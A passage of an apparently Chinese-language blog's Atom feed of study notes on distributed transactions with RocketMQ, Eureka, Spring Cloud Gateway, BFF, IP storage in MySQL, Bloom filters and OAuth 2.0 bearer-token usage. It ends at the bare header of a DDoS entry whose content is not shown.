    <link href="http://example.com/2020/09/16/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/11%E3%80%81%E9%AB%98%E9%A2%91%E7%82%B9%E9%97%AE%E9%A2%98/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1-%E5%BC%82%E6%AD%A5%E6%B6%88%E6%81%AF%E7%A1%AE%E4%BF%9D/"/>
    <id>http://example.com/2020/09/16/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/11%E3%80%81%E9%AB%98%E9%A2%91%E7%82%B9%E9%97%AE%E9%A2%98/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1-%E5%BC%82%E6%AD%A5%E6%B6%88%E6%81%AF%E7%A1%AE%E4%BF%9D/</id>
    <published>2020-09-15T22:58:06.000Z</published>
    <updated>2020-09-19T00:57:40.308Z</updated>
    
    <content type="html"><![CDATA[<p>==当事务发起方执行完成本地事务后并发出一条消息，事务参与方(消息消费者)一定能 够接收消息并处理事务成功==</p><p>此可靠消息最终一致性方案要解决以下几个问题：</p><p>1.本地事务与消息发送的原子性问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">begin transaction； </span><br><span class="line">&#x2F;&#x2F;1.发送MQ </span><br><span class="line">&#x2F;&#x2F;2.本地数据库操作 </span><br><span class="line">commit transation;</span><br><span class="line"></span><br><span class="line">begin transaction； </span><br><span class="line">&#x2F;&#x2F;1.本地数据库操作 </span><br><span class="line">&#x2F;&#x2F;2.发送MQ </span><br><span class="line">commit transation;</span><br></pre></td></tr></table></figure><p>虽然是原子性，两种方式都有可能是数据库操作异常，但MQ最终是发送出去，导致数据不一致</p><p>2、事务参与方接收消息的可靠性<br>事务参与方必须能够从消息队列接收到消息，如果接收消息失败可以重复接收消息。</p><p>3、消息重复消费的问题：下游做消息消费的幂等处理</p><p>RocketMQ实现可靠消息最终一致性事务。针对以上问题的解决方案：</p><p>RocketMQ主要解决了两个功能： </p><ul><li>1、本地事务与消息发送的原子性问题。 </li><li>2、事务参与方接收消息的可靠性。<br>具体参考笔记：RocketMQ事务消息<br><a href="http://note.youdao.com/noteshare?id=420d588c673e85de9add4c9089db8062&amp;sub=C4D87D9DD04441C7845C5131269D9D1F">http://note.youdao.com/noteshare?id=420d588c673e85de9add4c9089db8062&amp;sub=C4D87D9DD04441C7845C5131269D9D1F</a></li></ul><p>可靠消息最终一致性就是保证消息从生产方经过消息中间件传递到消费方的一致性，本案例使用了RocketMQ作为 消息中间件 可靠消息最终一致性事务适合执行周期长且实时性要求不高的场景。引入消息机制后，同步的事务操作变为基于消 息执行的异步操作, 避免了分布式事务中的同步阻塞操作的影响，并实现了两个服务的解耦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;==当事务发起方执行完成本地事务后并发出一条消息，事务参与方(消息消费者)一定能 够接收消息并处理事务成功==&lt;/p&gt;
&lt;p&gt;此可靠消息最终一致性方案要解决以下几个问题：&lt;/p&gt;
&lt;p&gt;1.本地事务与消息发送的原子性问题&lt;/p&gt;
&lt;figure class=&quot;highlig</summary>
      
    
    
    
    <category term="分布式事务解决方案" scheme="http://example.com/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    
    
    <category term="分布式事务-异步消息确保" scheme="http://example.com/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1-%E5%BC%82%E6%AD%A5%E6%B6%88%E6%81%AF%E7%A1%AE%E4%BF%9D/"/>
    
  </entry>
  
  <entry>
    <title>eureka原理</title>
    <link href="http://example.com/2020/09/14/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/1%E3%80%81spring/spring-cloud/1%E3%80%81Eureka/4%E3%80%81eureka%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2020/09/14/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/1%E3%80%81spring/spring-cloud/1%E3%80%81Eureka/4%E3%80%81eureka%E5%8E%9F%E7%90%86/</id>
    <published>2020-09-14T06:33:43.000Z</published>
    <updated>2020-09-19T00:57:40.988Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/suifeng629/article/details/102812715">https://blog.csdn.net/suifeng629/article/details/102812715</a></p><p>1、Eureka Client会每隔30秒去找Eureka Server拉取最近注册表的变化</p><p>2、Eureka Client每隔30秒会发送一次心跳到Eureka Server</p><p>如此高频率的请求，Eureka是如何抗住的。</p><h3 id="1、Eureka基于内存-存储的注册表"><a href="#1、Eureka基于内存-存储的注册表" class="headerlink" title="1、Eureka基于内存 存储的注册表"></a>1、Eureka基于内存 存储的注册表</h3><p>Eureka Server的注册表直接基于纯内存，即在内存里维护了一个数据结构。各个服务的注册、服务下线、服务故障，全部会在内存里维护和更新这个注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ConcurrentHashMap&lt;String, Map&lt;String, Lease&lt;InstanceInfo&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ul><li>外层key是实例名称：appName，</li><li>value则代表了一个服务的多个服务实例。内层的key是instanceId(服务实例的id)</li></ul><p>value是一个叫做Lease的类，它的泛型是一个叫做InstanceInfo</p><ul><li>Lease：里面则会维护每个服务最近一次发送心跳的时间</li><li>InstanceInfo：服务实例的具体信息，比如机器的ip地址、hostname以及端口号<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ConcurrentHashMap&lt;appName, Map&lt;instanceId, Lease&lt;InstanceInfo&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2、多级缓存机制"><a href="#2、多级缓存机制" class="headerlink" title="2、多级缓存机制"></a>2、多级缓存机制</h3><p>在拉取注册表的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一步从ReadOnlyCacheMap里查缓存的注册表。</span><br><span class="line">    有--&gt;直接返回</span><br><span class="line">    没有--&gt;就从ReadWriteCacheMap里查缓存的注册表。</span><br><span class="line">        有--&gt;直接返回</span><br><span class="line">        没有--&gt;从内存中获取实际的注册表数据</span><br><span class="line">            有--&gt;直接返回</span><br><span class="line">            没有--&gt; 内存中获取实际的注册表数据</span><br></pre></td></tr></table></figure><p>在注册表发生变更的时候：</p><ul><li>会在内存中更新变更的注册表数据，同时过期掉ReadWriteCacheMap。</li><li>此过程不会影响ReadOnlyCacheMap提供人家查询注册表。</li><li>一段时间内（默认30秒），各服务拉取注册表会直接读ReadOnlyCacheMap</li><li>30秒过后，Eureka Server的后台线程发现ReadWriteCacheMap已经清空了，也会清空ReadOnlyCacheMap中的缓存</li><li>下次有服务拉取注册表，又会从内存中获取最新的数据了，同时填充各个缓存。</li></ul><p>多级缓存机制的优点是什么？</p><ul><li>尽可能保证了内存注册表数据不会出现频繁的读写冲突问题。</li><li>并且进一步保证对Eureka Server的大量请求，都是快速从纯内存走，性能极高。</li></ul><p>在接受客户端注册的时候，服务端会将读写缓存的key清掉，30s后只读缓存从读写缓存拉取数据的时候，该服务列表获取到的是最新的数据。如果客户端下线，同样地，读写缓存也会被清除掉。==所以极端情况，最长30s后，客户端才能获取到最新的服务列表==。<br>因为注册服务更重要的是可用性，我们可以接受短期内达不到一致性的状况</p>]]></content>
    
    
    <summary type="html">https://blog.csdn.net/suifeng629/article/details/102812715</summary>
    
    
    
    <category term="Eureka" scheme="http://example.com/categories/Eureka/"/>
    
    
    <category term="eureka原理" scheme="http://example.com/tags/eureka%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>gateway原理</title>
    <link href="http://example.com/2020/09/14/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/1%E3%80%81spring/spring-cloud/5%E3%80%81%E7%BD%91%E5%85%B3/4%E3%80%81gateway%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2020/09/14/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/1%E3%80%81spring/spring-cloud/5%E3%80%81%E7%BD%91%E5%85%B3/4%E3%80%81gateway%E5%8E%9F%E7%90%86/</id>
    <published>2020-09-14T06:33:43.000Z</published>
    <updated>2020-09-19T00:57:41.444Z</updated>
    
    <content type="html"><![CDATA[<p>Spring Cloud Gateway 依赖 Spring Boot 和 Spring WebFlux，基于 Netty 运行。它不能在传统的 servlet 容器中工作，也不能构建成 war 包。struts2，springmvc等都是基于Servlet API与Servlet容器基础之上运行的</p><p>Gateway是基于WebFlux的. webflux，基于 spring 5.x 和 reactor-netty 构建，不依赖于 Servlet 容器，但是可以在支持 Servlet 3.1 Non-Blocking IO API 的容器上运行。</p><p>Spring Cloud Gateway 核心概念</p><p>Route<br>Route 是网关的基础元素，由 ID、目标 URI、断言、过滤器组成。当请求到达网关时，由 Gateway Handler Mapping 通过断言进行路由匹配（Mapping），当断言为真时，匹配到路由。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class Route implements Ordered &#123;</span><br><span class="line">    &#x2F;&#x2F;id，标识符，区别于其他 Route。</span><br><span class="line">    private final String id;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;路由指向的目的地 uri</span><br><span class="line">    private final URI uri;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;用于多个 Route 之间的排序，数值越小排序越靠前</span><br><span class="line">    private final int order;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;谓语，表示匹配该 Route 的前置条件，即满足相应的条件才会被路由到目的地 uri。</span><br><span class="line">    private final AsyncPredicate&lt;ServerWebExchange&gt; predicate;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;过滤器用于处理切面逻辑，如路由转发前修改请求头等。</span><br><span class="line">    private final List&lt;GatewayFilter&gt; gatewayFilters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）Predicate<br>Predicate 是 Java 8 中提供的一个函数。输入类型是 Spring Framework ServerWebExchange。它允许开发人员匹配来自 HTTP 的请求，例如请求头或者请求参数。简单来说它就是匹配条件。</p><p>3）Filter<br>Filter 是 Gateway 中的过滤器，可以在请求发出前后进行一些业务上的处理。</p><p>gateway 的工作机制：Gateway 接收客户端请求。客户端请求与路由信息进行匹配，匹配成功的才能够被发往相应的下游服务。请求经过 Filter 过滤器链，执行 pre 处理逻辑，如修改请求头信息等。请求被转发至下游服务并返回响应。响应经过 Filter 过滤器链，执行 post 处理逻辑。向客户端响应应答。<br><img src="https://docs.spring.io/spring-cloud-gateway/docs/2.2.5.RELEASE/reference/html/images/spring_cloud_gateway_diagram.png" alt="image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Spring Cloud Gateway 依赖 Spring Boot 和 Spring WebFlux，基于 Netty 运行。它不能在传统的 servlet 容器中工作，也不能构建成 war 包。struts2，springmvc等都是基于Servlet API与Ser</summary>
      
    
    
    
    <category term="网关" scheme="http://example.com/categories/%E7%BD%91%E5%85%B3/"/>
    
    
    <category term="gateway原理" scheme="http://example.com/tags/gateway%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>BFF</title>
    <link href="http://example.com/2020/09/14/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/1%E3%80%81spring/spring-cloud/BFF/"/>
    <id>http://example.com/2020/09/14/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/1%E3%80%81spring/spring-cloud/BFF/</id>
    <published>2020-09-14T06:33:42.000Z</published>
    <updated>2020-09-19T00:57:41.568Z</updated>
    
    <content type="html"><![CDATA[<p>将组装、聚合、裁剪这部分业务单独拎出来，组成一个叫Back-end for Front-end的中间层。</p><p>BFF作为中间层，优点是：</p><p>前后端彻底分离，即便是后期有微服务迁移，也不需改动前端代码</p><p>业务更向前靠拢，琐碎的api由前端开发自己决定，更适配前端框架</p><p>BFF可以自开mock，插件也能生成API文档，相比后端单开这类服务要方便些吧</p><p>留给后端更清晰的服务边界，只需要提供粗粒度的接口即可</p><p>BFF的缺点</p><p>中间层转发会增加请求延迟。</p><p>需要保证端到端测试</p><p>必须随时准备好后端异常请求</p><p>BFF分成会增加开发成本</p>]]></content>
    
    
    <summary type="html">将组装、聚合、裁剪这部分业务单独拎出来，组成一个叫Backend for Frontend的中间层。</summary>
    
    
    
    <category term="spring-cloud" scheme="http://example.com/categories/spring-cloud/"/>
    
    
    <category term="BFF" scheme="http://example.com/tags/BFF/"/>
    
  </entry>
  
  <entry>
    <title>如何存储IP地址</title>
    <link href="http://example.com/2020/09/14/Study%20notes/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93/1%E3%80%81%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql/%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8IP%E5%9C%B0%E5%9D%80/"/>
    <id>http://example.com/2020/09/14/Study%20notes/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93/1%E3%80%81%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/mysql/%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8IP%E5%9C%B0%E5%9D%80/</id>
    <published>2020-09-14T06:33:42.000Z</published>
    <updated>2020-09-19T00:57:42.502Z</updated>
    
    <content type="html"><![CDATA[<p> IP地址 本来就是一个字符串，存放在数据库作为字符穿类型</p><p> 网络地址：<br>192.168.33.123每一个值最大不会越过255，也就是十六进制的FF，两个Byte刚好表示的最大值是255，<br>这样子，就可以用一个32位的整形来保存这个IP<br>1100 0000 1010 1000 0010 0001 0111 1011<br>把这些二进制合在一起就是32位的数了<br>11000000101010000010000101111011<br>十进制为<br>3232244091</p><p>《高性能MySQL 第3版》第4.1.7节时，作者建议当存储IPv4地址时，应该使用32位的无符号整数（UNSIGNED INT）来存储IP<br>地址<br>优点：</p><ul><li>节省空间，不管是数据存储空间，还是索引存储空间</li><li>便于使用范围查询（BETWEEN…AND），且效率更高</li></ul><p>如果是 IPv4地址 的话 可通过数据库自带的函数 INET_ATON 和 INET_NTOA 进行转化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT INET_ATON(&#39;209.207.224.40&#39;);</span><br><span class="line">-&gt; 3520061480</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT INET_NTOA(3520061480);</span><br><span class="line">-&gt; &#39;209.207.224.40&#39;</span><br></pre></td></tr></table></figure><p>如果是 IPv6地址 的话，MySQL 5.6 版本之后。则使用函数 INET6_ATON 和 INET6_NTOA 进行转化。然后数据库定义为 varbinary 类型，分配 128bits 空间（因为 ipv6采用的是128bits，16个字节）；或者定义为 char 类型，分配<br>32bits 空间</p>]]></content>
    
    
    <summary type="html">IP地址 本来就是一个字符串，存放在数据库作为字符穿类型</summary>
    
    
    
    <category term="mysql" scheme="http://example.com/categories/mysql/"/>
    
    
    <category term="如何存储IP地址" scheme="http://example.com/tags/%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8IP%E5%9C%B0%E5%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>布隆算法</title>
    <link href="http://example.com/2020/09/13/Study%20notes/1%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/2%E3%80%81%E7%AE%97%E6%B3%95/%E5%B8%83%E9%9A%86%E7%AE%97%E6%B3%95/"/>
    <id>http://example.com/2020/09/13/Study%20notes/1%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/2%E3%80%81%E7%AE%97%E6%B3%95/%E5%B8%83%E9%9A%86%E7%AE%97%E6%B3%95/</id>
    <published>2020-09-13T13:23:08.000Z</published>
    <updated>2020-09-19T00:57:38.911Z</updated>
    
    <content type="html"><![CDATA[<p>如何判断一个元素在亿级数据中是否存在？</p><p>想判断一个元素是不是在一个集合中存在，传统做法都是将集合中的元素某种数据结构中。如：数组、链表、hash表等等。然后通过比较判断是否存在。<br>常见思路：</p><ul><li>1、将数据存储在数据库中，然后判断是否存在</li><li>2、使用hash表，可以接近O(1)的代价查询是否存在（大数据量很耗费空间，内存溢出）</li><li>3、数据先经过MD5或SHA-1等单向哈希函数，再保存到hash表中。较方法二更节约空间。（节约了空间，但多了一次hash,就增加了时间成本）</li><li>4、使用位图算法。建立一个BitSet，判断数据是否存在。（单一哈希函数冲突太高）</li></ul><p>总结：</p><ul><li>储存在内存中，效率快，但是对内存消耗高。以空间换时间</li><li>存储在磁盘中，效率低，内存消耗小。以空间换时间</li></ul><p>以上方式都是在保证100%准确的前提解决方案。若允许小概率错误，可以找到时间和空间消耗都比较小的数据结构和算法的解决方案：Bloom Filter</p><p>优点：时间和空间消耗都比较小的 大规模数据排重算法<br>缺点：有一定的误识别率和删除困难。</p><p><a href="https://www.jianshu.com/p/b9bd502a386a">https://www.jianshu.com/p/b9bd502a386a</a>  </p><p>其原理比较简单，如下图所示，S集合中有n个元素，利用k个哈希函数，将S中的每个元素映射到一个长度为m的位（bit）数组B中不同的位置上，这些位置上的二进制数均置为1，如果待检测的元素经过这k个哈希函数的映射后，发现其k个位置上的二进制数不全是1，那么这个元素一定不在集合S中，反之，该元素可能是S中的某一个元素（参考1）；<img src="https://img2018.cnblogs.com/blog/1775037/201910/1775037-20191008173752927-1989369488.png" alt="image"></p><p>那么到底需要多少个哈希函数，以及创建长度为多少的bit数组比较合适，为了估算出k和m的值，在构造一个布隆过滤器时，需要传入两个参数，即可以接受的误判率fpp和元素总个数n（不一定完全精确）。至于参数估计的方法，有兴趣的同学可以参考维基英文页面，下面直接给出公式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以用2个哈希函数来模拟k个哈希函数，</span><br><span class="line">即gi(x) &#x3D; h1(x) + ih2(x) ，其中0&lt;&#x3D;i&lt;&#x3D;k-1；</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">如何判断一个元素在亿级数据中是否存在？</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="布隆算法" scheme="http://example.com/tags/%E5%B8%83%E9%9A%86%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>OAuth2.0</title>
    <link href="http://example.com/2020/09/13/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/aouth2.0/OAuth2.0/"/>
    <id>http://example.com/2020/09/13/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/aouth2.0/OAuth2.0/</id>
    <published>2020-09-13T00:02:31.000Z</published>
    <updated>2020-09-19T00:57:42.480Z</updated>
    
    <content type="html"><![CDATA[<p>OAuth（开放授权）是一个开放标准，允许用户让第三方应用访问该用户在某一网站上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。</p><p>OAuth1.0协议太复杂，易用性差。2.0是一个新的设计，协议简单清晰，但它并不兼容1.0，可以说与1.0没什么关系。</p><p>OAuth 2.0是==应用之间彼此访问数据的开源授权协议==，就是保证第三方（软件）只有在获得授权之后，才可以进一步访问授权者的数据。==授权的核心就是颁发访问令牌、使用访问令牌==。</p><p>OAuth 2.0 针对不同的使用场景，提供了4 种基础的许可类型，分别是</p><ul><li>授权码许可（最常用授权方式）</li><li>隐式许可（Implicit）、</li><li>客户端凭据许可（Client Credentials）、</li><li>资源拥有者凭据许可（Resource Owner Password Credentials）</li></ul><p>使用一个APP如果重新注册用户，那你还得上传头像、输手机号等信息（导致营销短信轰炸）。使用第三方帐号微信来登录，那极客时间会直接使用你微信的这些信息作为基础信息</p><p>OAuth 2.0 的体系里面有 4 种角色，按照官方的称呼它们分别是资源拥有者（用户）、客户端(三方软件)、授权服务（微信，facebook）和受保护资源(微信的头像等信息，京东的订单等)</p><p>授权码许可流程有两种通信方式。</p><p>一种是前端通信，因为它通过浏览器促成了授权码的交互流程，比如京东商家开放平台的授权服务生成授权码发送到浏览器，第三方软件小兔从浏览器获取授权码。正因为获取授权码的时候小兔软件和授权服务并没有发生直接的联系，也叫做间接通信。另外一种是后端通信，在小兔软件获取到授权码之后，在后端服务直接发起换取访问令牌的请求，也叫做直接通信。</p><p>在 OAuth 2.0 中，访问令牌被要求有极高的安全保密性，因此我们不能让它暴露在浏览器上面，只能通过第三方软件（比如小兔）的后端服务来获取和使用，以最大限度地保障访问令牌的安全性。正因为访问令牌的这种安全要求特性，当需要前端通信，比如浏览器上面的流转的时候，OAuth 2.0 才又提供了一个临时的凭证：授权码。通过授权码的方式，可以让用户小明在授权服务上给小兔授权之后，还能重新回到小兔的操作页面上。这样，在保障安全性的情况下，提升了小明在小兔上的体验</p><p>没有授权码的思路继续想，如果这里直接返回访问令牌，那我们肯定不能使用重定向的方式。因为这样会把安全保密性要求极高的访问令牌暴露在浏览器上，从而将会面临访问令牌失窃的安全风险</p><p>没有授权码的话，我们就只能把访问令牌发送给第三方软件小兔的后端服务<br>为了重新建立起这样的一次连接，我们又不能让访问令牌暴露出去，就有了这样一个临时的、间接的凭证：授权码。</p><p><img src="https://gw.alipayobjects.com/zos/skylark-tools/public/files/d59072bc8f690dd26cfa45f5d08017f4.png" alt="image"></p><p>第一步，用户访问客户端web应用。应用中的按钮”通过Facebook登录”(或者其他的系统，如Google或Twitter)。</p><p>第二步，当用户点击了按钮后，会被重定向到授权的应用(如Facebook)。用户登录并确认授权应用中的数据给客户端应用。</p><p>第三步，授权应用Facebook将用户重定向到客户端应用提供的URI，提供这种重定向的URI通常是通过注册客户端应用程序与授权应用程序完成。在注册中，客户端应用的拥有者组注册该重定向URI，在注册过程中认证应用也会给客户端应用客户端标识和密码。在URI后追加一个认证码。该认证码代表了授权。</p><p>第四步，用户在客户端应用访问网页被定位到重定向的URI。在背后客户端应用连接授权应用，并且发送在重定向请求参数中接收到的客户端标识，客户端密码和认证码。授权应用将返回一个访问口令。</p><p>一旦客户端有了访问口令，该口令便可以被发送到Facebook、Google、Twitter等来访问登录用户的资源。重点步骤，也就是两次重定向</p>]]></content>
    
    
    <summary type="html">OAuth（开放授权）是一个开放标准，允许用户让第三方应用访问该用户在某一网站上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。</summary>
    
    
    
    <category term="aouth2.0" scheme="http://example.com/categories/aouth2-0/"/>
    
    
    <category term="OAuth2.0" scheme="http://example.com/tags/OAuth2-0/"/>
    
  </entry>
  
  <entry>
    <title>使用OAuth2.0构建一个授权服务</title>
    <link href="http://example.com/2020/09/12/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/aouth2.0/%E4%BD%BF%E7%94%A8OAuth2.0%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1/"/>
    <id>http://example.com/2020/09/12/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/aouth2.0/%E4%BD%BF%E7%94%A8OAuth2.0%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1/</id>
    <published>2020-09-12T07:33:56.000Z</published>
    <updated>2020-09-19T00:57:42.484Z</updated>
    
    <content type="html"><![CDATA[<p>1、为三方软件提供注册入口，分配app_id 和 app_secret、以及授权范围</p><p>2、颁发授权码 code</p>]]></content>
    
    
    <summary type="html">1、为三方软件提供注册入口，分配app_id 和 app_secret、以及授权范围</summary>
    
    
    
    <category term="aouth2.0" scheme="http://example.com/categories/aouth2-0/"/>
    
    
    <category term="使用OAuth2.0构建一个授权服务" scheme="http://example.com/tags/%E4%BD%BF%E7%94%A8OAuth2-0%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>三方软件接入OAuth2.0</title>
    <link href="http://example.com/2020/09/12/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/aouth2.0/%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%8E%A5%E5%85%A5OAuth2.0/"/>
    <id>http://example.com/2020/09/12/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/aouth2.0/%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%8E%A5%E5%85%A5OAuth2.0/</id>
    <published>2020-09-12T07:29:55.000Z</published>
    <updated>2020-09-19T00:57:42.482Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、注册信息"><a href="#1、注册信息" class="headerlink" title="1、注册信息"></a>1、注册信息</h4><p>先拥有自己的 app_id 和 app_serect 等信息，同时还要填写自己的回调地址 redirect_uri、申请scope 权限范围等信息。</p><h4 id="2、引导授权"><a href="#2、引导授权" class="headerlink" title="2、引导授权"></a>2、引导授权</h4><p>将用户引导至授权服务如微信，让用户为第三方软件授权。得到了授权之后，第三方软件才可以代表用户去访问数据</p><h4 id="3、使用访问令牌"><a href="#3、使用访问令牌" class="headerlink" title="3、使用访问令牌"></a>3、使用访问令牌</h4><p>OAuth 2.0 的令牌只支持一种类型，那就是 bearer 令牌，也就是我之前讲到的可以是任意字符串格式的令牌。<br>官方规范给出的使用访问令牌请求的方式，有三种，分别是</p><ul><li>Form-Encoded Body Parameter（表单参数）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST &#x2F;resource HTTP&#x2F;1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">access_token&#x3D;b1a64d5c-5e0c-4a70-9711-7af6568a61fb</span><br></pre></td></tr></table></figure>URI Query Parameter（URI 查询参数）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET &#x2F;resource?access_token&#x3D;b1a64d5c-5e0c-4a70-9711-7af6568a61fb HTTP&#x2F;1.1</span><br><span class="line">Host: server.example.com</span><br></pre></td></tr></table></figure>Authorization Request Header Field（授权请求头部字段）【推荐】<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET &#x2F;resource HTTP&#x2F;1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Authorization: Bearer b1a64d5c-5e0c-4a70-9711-7af6568a61fb</span><br></pre></td></tr></table></figure></li></ul><h4 id="4、使用刷新令牌。"><a href="#4、使用刷新令牌。" class="headerlink" title="4、使用刷新令牌。"></a>4、使用刷新令牌。</h4><p>一个设计良好的第三方应用，应该将 expires_in 值保存下来并定时检测；如果发现 expires_in 即将过期</p>]]></content>
    
    
    <summary type="html">1、注册信息</summary>
    
    
    
    <category term="aouth2.0" scheme="http://example.com/categories/aouth2-0/"/>
    
    
    <category term="三方软件接入OAuth2.0" scheme="http://example.com/tags/%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%8E%A5%E5%85%A5OAuth2-0/"/>
    
  </entry>
  
  <entry>
    <title>DDos攻击</title>
    <link href="http://example.com/2020/09/10/Study%20notes/%E5%AF%86%E7%A0%81%E5%AD%A6/web%E6%94%BB%E5%87%BB/4%E3%80%81DDos%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2020/09/10/Study%20notes/%E5%AF%86%E7%A0%81%E5%AD%A6/web%E6%94%BB%E5%87%BB/4%E3%80%81DDos%E6%94%BB%E5%87%BB/</id>
    <published>2020-09-10T06:38:17.000Z</published>
    <updated>2020-09-19T00:57:43.612Z</updated>
    
